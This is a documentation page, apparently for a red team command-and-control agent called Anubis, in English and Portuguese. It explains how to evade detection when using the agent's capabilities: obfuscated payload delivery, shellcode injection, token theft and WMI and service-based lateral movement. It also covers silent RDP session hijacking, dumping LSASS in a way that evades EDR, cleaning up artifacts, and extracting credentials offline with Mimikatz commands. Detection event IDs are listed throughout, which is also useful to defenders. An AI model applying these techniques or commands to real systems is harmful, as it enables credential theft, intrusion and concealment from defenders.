+++
title = "OPSEC"
chapter = false
weight = 10
pre = "<b>1. </b>"
+++

## OPSEC Considerations

This section describes the operational security implications of using the Anubis agent, covering detection risks, evasion capabilities, and recommended practices for Red Team engagements.

---

### Communications

| Risk | Mitigation |
|---|---|
| Predictable beacon interval | Use `sleep` with jitter: `sleep 60 20` (±20% of 60s) |
| HTTP traffic from unexpected process | Route through a legitimate-looking process via `shinject` into browser/system binary |
| TLS certificate mismatch | Set HTTPS verify to `No` during build, or use a valid cert on C2 server |
| Cloudflare-proxied URL | Enabled by default — URL-safe base64 prevents parameter corruption |

---

### Payload Storage & Delivery

| Risk | Mitigation |
|---|---|
| Python script readable on disk | Use `base64` output format for one-liner delivery |
| Static signature from script content | Enable `Obfuscate Script` at build time (XOR + Base64 + exec loader) |
| EXE blocked by AppLocker / WDAC | Deliver as `.py` / `.pyw` or use `ps1` format (Python Embeddable — no install) |
| No Python installed on target | Use `ps1` format: downloads Python Embeddable to `%TEMP%\svc<uuid>\`, runs hidden |
| AV detection of EXE | Use `exe` format only when PyInstaller output clears target AV; prefer `ps1` otherwise |
| Large initial footprint | Use `load` dynamically after initial access to avoid loading all capabilities on first drop |

The XOR obfuscation wraps the entire agent script in a randomized key XOR layer, then Base64-encodes and exec()-loads it:

![XOR Payload](/agents/anubis/xor.png)

---

### Process Execution

| Technique | Detection Risk | Notes |
|---|---|---|
| `shell` (cmd.exe spawn) | **High** | Command-line logging and process creation events (Event ID 4688) |
| `shinject` (VirtualAllocEx + RWX) | **High** | PAGE_EXECUTE_READWRITE allocation flagged by most EDR products |
| `load_dll` (LoadLibrary) | **Medium** | DLL load from suspicious paths monitored; reflective DLLs preferred |
| `dump_lsass` (NtCreateProcessEx fork) | **Medium** | Bypasses EDR hooks on LSASS PID; OpenProcess on lsass still logged |
| `screenshot2` (ctypes GDI) | **Low** | No flagged APIs; screenshot APIs not widely monitored |
| `eval_code` | **Low** | Executes in existing process context; no new process or file created |

---

### Token Impersonation (`token_steal` — T1134)

```
RtlAdjustPrivilege(29)              ← SeDebugPrivilege
OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid)
OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY)
DuplicateTokenEx(hToken, SecurityImpersonation, TokenImpersonation)
ImpersonateLoggedOnUser(hDuplicate)  ← thread-level impersonation
```

**Detection profile:**
- `OpenProcess` on privileged processes logged by Sysmon EID 10 (if process access auditing configured)
- No new logon event generated — `ImpersonateLoggedOnUser` is thread-level, not session-level
- `RevertToSelf()` called automatically after WMI operation or after explicit impersonation ends
- Access Token manipulation generally not monitored by default Windows audit policy

**Recommended use:** impersonate domain admin token from a service/process running in the user's context before calling `wmi_exec` or `sc_exec` — passes NTLM token transparently without credential input.

---

### WMI Lateral Movement (`wmi_exec` — T1047 / T1021.003)

```
CoInitializeEx → CoInitializeSecurity
CoCreateInstance(CLSID_WbemLocator) → IWbemLocator::ConnectServer(\\host\root\cimv2)
CoSetProxyBlanket(RPC_C_AUTHN_WINNT, EOAC_NONE)
IWbemServices::GetObject("Win32_Process") → GetMethod("Create") → SpawnInstance
IWbemClassObject::Put("CommandLine", VT_BSTR, command)
IWbemServices::ExecMethod("Win32_Process", "Create", pInParams)
→ Get("ProcessId") + Get("ReturnValue")
```

**Detection profile:**
- No `wmic.exe` spawned — all calls via COM vtable, indistinguishable from any application using WMI
- Generates entries in `Microsoft-Windows-WMI-Activity/Operational` on the **target** host
- Sysmon EID 19/20/21 (WMI event filter/consumer) **not** triggered — this is `ExecMethod`, not event subscription
- Network: DCE/RPC over TCP/135 + dynamic RPC port; may trigger firewall alerts if WMI not expected

**Output capture:** `wmi_exec` is fire-and-forget; redirect to file and retrieve:
```
wmi_exec 10.1.1.4 "cmd /c whoami > C:\Windows\Temp\o.txt 2>&1"
download C:\Windows\Temp\o.txt
```

---

### SCM Lateral Movement (`sc_exec` — T1021.002 / T1543.003)

```
OpenSCManagerW("\\target", NULL, SC_MANAGER_ALL_ACCESS)   ← TCP/445 SMB svcctl pipe
CreateServiceW(hSCM, rand_name, ..., SERVICE_WIN32_OWN_PROCESS, DEMAND_START,
               "C:\Windows\System32\cmd.exe /c <command>", LocalSystem)
StartServiceW(hSvc, 0, NULL)
time.sleep(3)
DeleteService(hSvc)
CloseServiceHandle × 2
```

**Detection profile:**

| Event | Host | Description |
|---|---|---|
| System EID **7045** | Target | "A service was installed in the system" — service name is 8-char hex random |
| System EID **7036/7009** | Target | Service started / request timeout (1053 expected for cmd.exe, treated as success) |
| Security EID **4697** | Target | Service installed (requires "Audit Security System Extension" policy) |
| Sysmon EID **1** | Target | `cmd.exe /c <command>` spawned by `services.exe` |
| Security EID **4624** | Target | Logon type 3 (network) for the SCM connection from source host |

**Network requirement:** TCP/445 to target (SMB named pipe `\pipe\svcctl`). SMB signing disabled or bypassed required for relay scenarios; for direct exec with valid credentials or impersonated token, signing state is irrelevant.

**OPSEC improvement:** pass a custom `svc_name` that matches a known legitimate service name pattern (e.g., `WinHTTP`, `DiagSvc`) to blend into EID 7045 noise.

---

### RDP Session Hijacking (`rdp_hijack` — T1563.002)

```
WTSEnumerateSessionsW(NULL, 0, 1, &ppInfo, &count)
WTSQuerySessionInformationW(sid, WTSUserName / WTSDomainName)
→ list: ID / Station / State / User

WTSConnectSession(target_sid, my_sid, L"", TRUE)
  ← requires NT AUTHORITY\SYSTEM
  ← no password verification performed
```

**Detection profile:**

| Event | Host | Condition |
|---|---|---|
| Security EID **4778** | Target | "A session was reconnected to a Window Station" — generated on hijack |
| Security EID **4779** | Target | "A session was disconnected from a Window Station" — if original session disconnects |
| No EID **4624** | Target | No new logon event for Disconnected session hijack — session already existed |

**Key OPSEC points:**
- Disconnected session hijack is **silent for the target user** — they receive no notification
- Active session hijack is visible — the user will see the cursor move and screen change
- EID 4778/4779 only generated if "Audit Other Logon/Logoff Events" policy is enabled
- `WTSConnectSession` requires `SYSTEM` — deploy via `sc_exec` first if running as user
- Prefer sessions in `Disconnected` state — list with `rdp_hijack` (shows `◄` marker)

**Recommended flow:**
```
# On compromised host A (token of domain admin impersonated):
sc_exec <host_B> "powershell -ep bypass -f C:\Windows\Temp\a.ps1"

# On new SYSTEM agent at host_B:
rdp_hijack               # list sessions
rdp_hijack 3             # hijack disconnected session (silent)
```

---

### Credential Dumping (`dump_lsass`)

The `dump_lsass` command uses a process fork technique to evade EDR hooks:

```
NtCreateProcessEx(ParentProcess=lsass_handle)
  → creates in-memory clone with inherited VAD (no visible PID assigned)
  → MiniDumpWriteDump(clone_handle, ProcessId=0)
  → EDR hook filtering on lsass.exe PID does not intercept
```

**Remaining detection risks:**
- `OpenProcess(PROCESS_ALL_ACCESS, lsass_pid)` is still logged by most EDR and SIEM (Event ID 10 in Sysmon)
- Credential Guard / PPL-protected LSASS blocks the technique entirely
- `NtCreateProcessEx` on lsass may trigger behavioral alerts in advanced EDR

**Recommended:** confirm Credential Guard status before attempting (`reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`).

---

### Post-Compromise Cleanup

- `rm` can remove artifacts on disk (T1070)
- `unload` removes dynamically loaded commands from agent memory
- `dump_lsass` deletes the dump file from disk automatically after upload
- `RevertToSelf()` is called after any SYSTEM token impersonation (`token_steal`, `sc_exec`)
- `sc_exec` auto-deletes the service after 3 seconds (EID 7034 cleanup event on target)

---

## Considerações de OPSEC (PT-BR)

### Comunicações
- Use jitter no beacon para evitar padrões previsíveis: `sleep 60 20`
- O agente usa encoding base64url-safe para evitar corrupção de parâmetros GET por proxies Cloudflare
- Desative verificação de certificado TLS no build se usar self-signed ou tunnel

### Armazenamento e Entrega do Payload
- Use formato `base64` + obfuscação XOR para reduzir detecção estática em disco
- Se Python não estiver no alvo: formato `ps1` (Python Embeddable — sem instalar nada) ou `exe` (PyInstaller)
- Carregue capacidades adicionais via `load` após acesso inicial, reduzindo footprint inicial

### Token Steal (T1134)
- Sem evento de logon (EID 4624) — impersonação é thread-level via `ImpersonateLoggedOnUser`
- `OpenProcess` em processos privilegiados ainda pode gerar Sysmon EID 10
- Após impersonação, chamadas WMI/SCM herdam o token automaticamente

### WMI Exec (T1047)
- Sem `wmic.exe` — sem EID 4688 de criação de processo para wmic
- Gera entradas no log `Microsoft-Windows-WMI-Activity/Operational` no alvo
- Sysmon EID 19/20/21 (event subscription) não é ativado — `ExecMethod` é diferente de WMI event subscription

### SC Exec (T1021.002)
- Gera System EID **7045** no alvo (serviço instalado) — nome do serviço é randômico (8 hex chars)
- Erro 1053 esperado e tratado como sucesso — cmd.exe não envia sinal de start ao SCM
- Serviço deletado automaticamente após 3s (geração mínima de artefatos)

### RDP Hijack (T1563.002)
- Hijack de sessão **Disconnected** é silencioso — sem notificação para o usuário
- EID 4778 gerado apenas se política "Audit Other Logon/Logoff Events" estiver habilitada
- Sem EID 4624 de logon — a sessão já existia (sem novo logon de rede)
- Requer SYSTEM — use `sc_exec` para elevar antes de executar no host alvo

### Dump LSASS — Detecção Residual
- `OpenProcess(PROCESS_ALL_ACCESS, lsass_pid)` → Sysmon Event ID 10
- Verifique Credential Guard antes: `reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`

### Análise do Dump Offline
```bash
# Kali/Linux
pypykatz lsa minidump forked_lsass.dmp

# Windows (Mimikatz)
sekurlsa::minidump forked_lsass.dmp
sekurlsa::logonpasswords
```
